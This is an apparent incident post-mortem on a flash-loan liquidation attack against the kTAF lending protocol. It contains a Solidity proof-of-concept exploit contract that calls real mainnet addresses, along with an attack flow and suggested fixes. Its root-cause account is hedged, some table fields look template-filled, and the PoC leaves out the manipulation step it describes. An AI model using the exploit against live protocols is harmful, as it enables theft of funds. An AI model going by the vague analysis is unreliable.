# kTAF Flash Loan Liquidation Attack Incident Analysis

## 1. Overview

| Field | Details |
|------|------|
| Project | kTAF (Lending Protocol) |
| Date | 2023-10-31 |
| Chain | Ethereum Mainnet |
| Loss | ~$8,000 USD |
| Attack Type | Flash Loan + Forced Liquidation |
| CWE | CWE-682 (Incorrect Calculation) |
| Attacker Address | `0x9b99d7ce9e39c68ab93348fd31fd4c99f79e4b19` |
| Attack Contract | `0x9b99d7ce9e39c68ab93348fd31fd4c99f79e4b19` |
| Vulnerable Contract | `0xf5140fc35c6f94d02d7466f793feb0216082d7e5` (kTAF) |
| Fork Block | Ethereum |

## 2. Vulnerable Code Analysis

kTAF is a Compound-fork-based lending protocol. The attacker secured large liquidity via a Balancer flash loan, then called `liquidateBorrow()` to liquidate undercollateralized positions at a discount. The liquidation condition was artificially triggered through oracle price manipulation or a momentary change in collateral ratio.

```solidity
// Vulnerable pattern: liquidateBorrow condition manipulation
contract kTAF {
    // Compound-style liquidation function
    function liquidateBorrow(
        address borrower,
        uint256 repayAmount,
        address cTokenCollateral
    ) external returns (uint256) {
        // Liquidation condition: collateral ratio < liquidationThreshold
        (uint256 err, uint256 liquidity, uint256 shortfall) = getAccountLiquidity(borrower);
        require(shortfall > 0, "Insufficient shortfall");

        // Liquidator repays loan → receives collateral tokens
        // Vulnerable: profit from liquidationIncentive after price manipulation via flash loan
        uint256 seizeTokens = liquidateCalculateSeizeTokens(
            address(this), cTokenCollateral, repayAmount
        );
        // ...
    }
}
```

**Vulnerability**: An attacker who acquired large funds via a Balancer flash loan induced a shortfall on a specific position in the kTAF market, then called `liquidateBorrow()` to collect the `liquidationIncentive` (typically 8–10%). Profit is generated when the oracle is vulnerable to intra-block price manipulation or when the liquidation incentive is set excessively high.

### On-Chain Source Code

Source: Sourcify verified

```solidity
// File: CErc20Immutable.sol
    function transferVerify(address cToken, address src, address dst, uint transferTokens) external;

// ...

    function _resignImplementation() public;

// ...

    function liquidateBorrowFresh(address liquidator, address borrower, uint repayAmount, CTokenInterface cTokenCollateral) internal returns (uint, uint) {
        /* Fail if liquidate not allowed */
        uint allowed = comptroller.liquidateBorrowAllowed(address(this), address(cTokenCollateral), liquidator, borrower, repayAmount);
        if (allowed != 0) {
            return (failOpaque(Error.COMPTROLLER_REJECTION, FailureInfo.LIQUIDATE_COMPTROLLER_REJECTION, allowed), 0);
        }

        /* Verify market's block number equals current block number */
        if (accrualBlockNumber != getBlockNumber()) {
            return (fail(Error.MARKET_NOT_FRESH, FailureInfo.LIQUIDATE_FRESHNESS_CHECK), 0);
        }

        /* Verify cTokenCollateral market's block number equals current block number */
        if (cTokenCollateral.accrualBlockNumber() != getBlockNumber()) {
            return (fail(Error.MARKET_NOT_FRESH, FailureInfo.LIQUIDATE_COLLATERAL_FRESHNESS_CHECK), 0);
        }

        /* Fail if borrower = liquidator */
        if (borrower == liquidator) {
            return (fail(Error.INVALID_ACCOUNT_PAIR, FailureInfo.LIQUIDATE_LIQUIDATOR_IS_BORROWER), 0);
        }

        /* Fail if repayAmount = 0 */
        if (repayAmount == 0) {
            return (fail(Error.INVALID_CLOSE_AMOUNT_REQUESTED, FailureInfo.LIQUIDATE_CLOSE_AMOUNT_IS_ZERO), 0);
        }

        /* Fail if repayAmount = -1 */
        if (repayAmount == uint(-1)) {
            return (fail(Error.INVALID_CLOSE_AMOUNT_REQUESTED, FailureInfo.LIQUIDATE_CLOSE_AMOUNT_IS_UINT_MAX), 0);
        }


        /* Fail if repayBorrow fails */
        (uint repayBorrowError, uint actualRepayAmount) = repayBorrowFresh(liquidator, borrower, repayAmount);
        if (repayBorrowError != uint(Error.NO_ERROR)) {
            return (fail(Error(repayBorrowError), FailureInfo.LIQUIDATE_REPAY_BORROW_FRESH_FAILED), 0);
        }

        /////////////////////////
        // EFFECTS & INTERACTIONS
        // (No safe failures beyond this point)

        /* We calculate the number of collateral tokens that will be seized */
        (uint amountSeizeError, uint seizeTokens) = comptroller.liquidateCalculateSeizeTokens(address(this), address(cTokenCollateral), actualRepayAmount);
        require(amountSeizeError == uint(Error.NO_ERROR), "LIQUIDATE_COMPTROLLER_CALCULATE_AMOUNT_SEIZE_FAILED");

        /* Revert if borrower collateral token balance < seizeTokens */
        require(cTokenCollateral.balanceOf(borrower) >= seizeTokens, "LIQUIDATE_SEIZE_TOO_MUCH");

        // If this is also the collateral, run seizeInternal to avoid re-entrancy, otherwise make an external call
        uint seizeError;
        if (address(cTokenCollateral) == address(this)) {
            seizeError = seizeInternal(address(this), liquidator, borrower, seizeTokens);
        } else {
            seizeError = cTokenCollateral.seize(liquidator, borrower, seizeTokens);
        }

        /* Revert if seize tokens fails (since we cannot be sure of side effects) */
        require(seizeError == uint(Error.NO_ERROR), "token seizure failed");

        /* We emit a LiquidateBorrow event */

// ...

    function seize(address liquidator, address borrower, uint seizeTokens) external nonReentrant returns (uint) {
        return seizeInternal(msg.sender, liquidator, borrower, seizeTokens);
    }
```

## 3. Attack Flow

```
Attacker [0x9b99d7ce9e39c68ab93348fd31fd4c99f79e4b19]
  │
  ├─1─▶ Balancer.flashLoan(tokens, amounts)
  │      [Balancer Vault: 0xBA12222222228d8Ba445958a75a0704d566BF2C8]
  │      Borrow large-scale funds
  │
  ├─2─▶ Manipulate kTAF market price/liquidity
  │      [kTAF: 0xf5140fc35c6f94d02d7466f793feb0216082d7e5]
  │      Induce shortfall on a specific position
  │
  ├─3─▶ kTAF.liquidateBorrow(borrower, repayAmount, cTokenCollateral)
  │      Liquidate the undercollateralized position
  │      → Profit from liquidationIncentive
  │
  ├─4─▶ Repay cToken + receive collateral tokens
  │      Sell liquidated collateral at market price
  │
  └─5─▶ Repay Balancer flash loan + realize ~$8,000 profit
```

## 4. PoC Core Code

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

interface IkTAF {
    function liquidateBorrow(
        address borrower,
        uint256 repayAmount,
        address cTokenCollateral
    ) external returns (uint256);
    function redeem(uint256 redeemTokens) external returns (uint256);
}

interface IBalancerVault {
    function flashLoan(
        address recipient,
        address[] calldata tokens,
        uint256[] calldata amounts,
        bytes calldata userData
    ) external;
}

contract kTAFExploit {
    IkTAF ktaf = IkTAF(0xf5140fc35c6f94d02d7466f793feb0216082d7e5);
    IBalancerVault balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);

    address targetBorrower;
    address cTokenCollateral;

    function testExploit(address _borrower, address _collateral) external {
        targetBorrower = _borrower;
        cTokenCollateral = _collateral;

        address[] memory tokens = new address[](1);
        tokens[0] = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48; // USDC
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 100_000e6;

        balancer.flashLoan(address(this), tokens, amounts, "");
    }

    function receiveFlashLoan(
        address[] calldata tokens,
        uint256[] calldata amounts,
        uint256[] calldata feeAmounts,
        bytes calldata
    ) external {
        // Execute kTAF liquidation
        IERC20(tokens[0]).approve(address(ktaf), amounts[0]);
        ktaf.liquidateBorrow(targetBorrower, amounts[0] / 2, cTokenCollateral);

        // Redeem received cTokens
        uint256 cTokenBal = IERC20(cTokenCollateral).balanceOf(address(this));
        ktaf.redeem(cTokenBal);

        // Sell collateral tokens to obtain USDC
        // ... DEX swap logic

        // Repay Balancer
        IERC20(tokens[0]).transfer(address(balancer), amounts[0] + feeAmounts[0]);
    }
}
```

## 5. Vulnerability Classification

| Field | Details |
|------|------|
| CWE | CWE-682 (Incorrect Calculation) |
| Vulnerability Type | Flash loan exploitation of liquidation incentive |
| Impact Scope | kTAF Lending pool |
| Explorer | [Etherscan](https://etherscan.io/address/0xf5140fc35c6f94d02d7466f793feb0216082d7e5) |

## 6. Security Recommendations

```solidity
// Fix 1: Cap the liquidation incentive
uint256 public constant MAX_LIQUIDATION_INCENTIVE = 1.05e18; // 5% maximum

function setLiquidationIncentive(uint256 newLiquidationIncentive) external onlyAdmin {
    require(newLiquidationIncentive <= MAX_LIQUIDATION_INCENTIVE, "Too high incentive");
    liquidationIncentive = newLiquidationIncentive;
}

// Fix 2: Use a TWAP oracle
function getPrice(address asset) internal view returns (uint256) {
    // Use 30-minute TWAP instead of spot price
    return IUniswapV3TWAP(oracle).consult(asset, 1800); // 30 minutes
}

// Fix 3: Liquidation delay mechanism
mapping(address => uint256) public liquidationCooldown;

function liquidateBorrow(address borrower, ...) external {
    require(
        block.timestamp >= liquidationCooldown[borrower] + 1 hours,
        "Liquidation cooldown active"
    );
    liquidationCooldown[borrower] = block.timestamp;
    // ...
}

// Fix 4: Cap the maximum liquidation ratio
function liquidateBorrow(address borrower, uint256 repayAmount, ...) external {
    uint256 maxRepay = getBorrowBalance(borrower) * closeFactor / 1e18;
    require(repayAmount <= maxRepay, "Exceeds close factor");
    // ...
}
```

## 7. Lessons Learned

1. **Compound-fork liquidation vulnerability**: Compound-style lending protocols are exposed to flash loan liquidation attacks when the `liquidationIncentive` is high and the oracle is weak. The liquidation incentive should be kept at 5% or below.
2. **Balancer flash loan usage**: Balancer provides zero-fee flash loans, making it a frequent tool for ETH-based liquidation attacks. Liquidation logic must be designed assuming zero-cost capital availability.
3. **Oracle manipulation and liquidation**: Spot-price oracles can be manipulated via flash loans. Liquidation condition checks in lending protocols should use TWAP or Chainlink aggregator oracles.
4. **Small-scale lending protocols**: While this was a small $8K attack, protocols running larger pools on the same codebase are exposed to significantly greater losses.